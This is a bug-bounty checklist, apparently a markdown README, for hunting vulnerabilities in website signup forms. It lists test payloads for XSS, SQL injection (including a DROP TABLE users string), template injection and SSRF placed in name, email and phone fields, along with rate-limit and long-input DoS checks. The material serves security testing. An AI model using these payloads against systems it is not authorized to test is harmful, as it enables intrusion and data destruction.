
# Signup feature
**Hunt bugs in signup functionality**

## Duplicate Registration
1. Create 1st account with email ``abc@xyz.com`` and password
2. logout. && Then Create another account with email ``abc@xyz.com`` and with different password
    - If 1st account gets deleted **(Vuln)**

## No Rate Limit
1. Go to signup page and enter details
2. Capture the signup request and send it to repeater
3. Add different emails as payload
    - check whether all response all ``200 OK`` **(Vuln)**

## Dos
1. Go to Signup page and fill details
2. Use long character/string in username,password,firstname field(1000)
    - See if server shows ``500 Internet Server Error`` **(Vuln)**

## SSTI
+ Use Template Injection Payload in User,First Name ``{{7*7}}`` 
    - Check if ``{{7*7}}`` change into ``49``. If server shows ``49`` **(Vuln)**

## XSS
+ Use XSS Payload in First name,last Name,etc..
    - ``<svg/onload=alert(1)>``
---------------------------------
## EMail field
### SSTI
+ ``<%=7*7%>"@example.com``
+ ``test+(${{7*7}})@example.com``
    
### SSRF
+ ``testmail.abc@xyz.burpcollab.net``
+ ``name.abc@[127.0.0.1]``

### XSS
+ ``test+(<script>alert(1)</script>)@example.com``
+ ``"hello<form/><!><details/open/ontoggle=alert(1)>"@gmail.com``
+ ``test@xyz(<script>alert(1)</script>).com``
+ ``"<script>alert(1)</script>"@xyz.com``
+ ``"><svg/onload=alert(1)>"@xyz.com``
 
### SQLI
+ ``"'OR 1=1--'"@example.com``
+ ``"mail');DROP TABLE users;--"@xyz.com``

---------------------------------------------------------------------------

## Phone-numbers Payloads
### XSS 
+ ``+910987654321;phone-context=<script>alert(1)</script>``
### SQLi
+ ``+912345667790;phone-context='OR 1=1;--``
### SSTI
+ ``+919324862346;phone-context={{7*7}}[[3*3]]``
### SSRF 
+ ``+919834763495634;phone-context=burpcollaburl``